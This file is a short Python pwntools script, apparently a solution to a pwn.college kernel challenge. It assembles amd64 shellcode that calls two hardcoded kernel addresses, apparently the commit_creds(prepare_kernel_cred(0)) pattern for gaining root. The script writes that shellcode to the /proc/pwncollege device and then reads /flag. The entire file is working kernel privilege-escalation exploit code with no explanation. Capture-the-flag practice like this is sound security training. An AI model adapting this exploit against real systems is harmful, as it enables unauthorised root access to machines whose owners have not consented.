import pwn
pwn.context.arch = "amd64"

asm = """
xor    edi,edi
mov    rbx,0xffffffff81089660
call   rbx
mov    rdi,rax
mov    rbx,0xffffffff81089310
call   rbx
mov    rdi,0xffffffffc0006011
mov    rbx,0xffffffff810b69a9
call   rbx
xor    eax,eax
ret
"""

asm = """
    push rbx
    push rbp
    mov rbp, rsp
    xor rdi, rdi
    mov rbx, 0xffffffff81089660
    call rbx
    mov rdi, rax
    mov rbx, 0xffffffff81089310
    call rbx
    mov rsp, rbp
    pop rbp
    pop rbx
    ret
"""

shellcode = pwn.asm(asm)
print(shellcode)
#with open('code/creds.bin', 'rb') as sc:
#    with open('/proc/pwncollege', 'wb') as f:
#        f.write(sc.read())

with open('/proc/pwncollege', 'wb') as f:
    f.write(shellcode)

with open("/flag", 'r') as f:
    print(f.read())
